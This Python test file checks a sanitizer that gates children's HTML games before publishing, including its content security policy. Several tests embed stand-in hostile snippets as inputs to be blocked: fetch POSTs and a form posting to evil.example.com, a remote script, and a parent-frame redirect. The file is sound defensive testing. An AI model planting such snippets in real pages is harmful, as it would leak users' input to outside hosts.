"""The publish gate for learner-authored HTML.

Every case here is something a model actually produces when a child asks for a
game, so the assertions are about what the gate lets through as much as what it
stops.
"""

from __future__ import annotations

import os
import sys
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from app.services.workshop import sanitizer  # noqa: E402


def _document(body: str, head: str = "") -> str:
    return f"<!DOCTYPE html><html dir=\"rtl\"><head>{head}</head><body>{body}</body></html>"


class WorkshopSanitizerTests(unittest.TestCase):
    def test_a_plain_inline_game_is_publishable(self):
        html = _document(
            "<canvas id=\"sky\"></canvas>"
            "<script>const ship = {x: 10}; document.getElementById('sky');</script>",
            head="<meta charset=\"utf-8\"><style>body{background:#0b1b3a}</style>",
        )
        self.assertEqual(sanitizer.assert_publishable(html), [])

    def test_a_library_from_the_allowlist_is_publishable(self):
        html = _document(
            "<script src=\"https://cdn.jsdelivr.net/npm/phaser@3/dist/phaser.min.js\"></script>"
        )
        self.assertEqual(sanitizer.assert_publishable(html), [])

    def test_a_script_from_an_unknown_host_is_blocked(self):
        html = _document("<script src=\"https://evil.example.com/x.js\"></script>")
        self.assertIn("external_resource", sanitizer.assert_publishable(html))

    def test_a_nested_frame_is_blocked(self):
        html = _document("<iframe src=\"/api/workshop/projects/other/artifact\"></iframe>")
        self.assertIn("forbidden_tag", sanitizer.assert_publishable(html))

    def test_sending_what_the_child_typed_anywhere_is_blocked(self):
        html = _document("<script>fetch('https://evil.example.com', {method:'POST'});</script>")
        self.assertIn("network_call", sanitizer.assert_publishable(html))

    def test_storage_access_is_blocked(self):
        html = _document("<script>localStorage.setItem('score', 5);</script>")
        self.assertIn("storage_access", sanitizer.assert_publishable(html))

    def test_reaching_out_of_the_frame_is_blocked(self):
        html = _document("<script>parent.location = 'https://evil.example.com';</script>")
        self.assertIn("frame_escape", sanitizer.assert_publishable(html))

    def test_an_inline_handler_is_scanned_too(self):
        html = _document("<button onclick=\"fetch('https://evil.example.com')\">go</button>")
        self.assertIn("network_call", sanitizer.assert_publishable(html))

    def test_a_form_posting_offsite_is_blocked(self):
        html = _document("<form action=\"https://evil.example.com/collect\"></form>")
        self.assertIn("external_form", sanitizer.assert_publishable(html))

    def test_a_meta_refresh_is_blocked_but_a_charset_is_not(self):
        self.assertIn(
            "meta_refresh",
            sanitizer.assert_publishable(
                _document("", head="<meta http-equiv=\"refresh\" content=\"0;url=/\">")
            ),
        )
        self.assertEqual(
            sanitizer.assert_publishable(_document("", head="<meta charset=\"utf-8\">")),
            [],
        )

    def test_an_empty_build_is_not_an_artifact(self):
        self.assertEqual(sanitizer.assert_publishable("   "), ["empty_document"])

    def test_an_oversized_document_is_rejected_before_it_is_parsed(self):
        self.assertEqual(
            sanitizer.assert_publishable(_document("x" * (sanitizer.MAX_BYTES + 1))),
            ["too_large"],
        )

    def test_the_runtime_policy_denies_the_network_and_the_same_origin(self):
        policy = sanitizer.content_security_policy()
        self.assertIn("sandbox allow-scripts", policy)
        self.assertNotIn("allow-same-origin", policy)
        self.assertIn("connect-src 'none'", policy)
        self.assertIn("frame-src 'none'", policy)


if __name__ == "__main__":
    unittest.main()
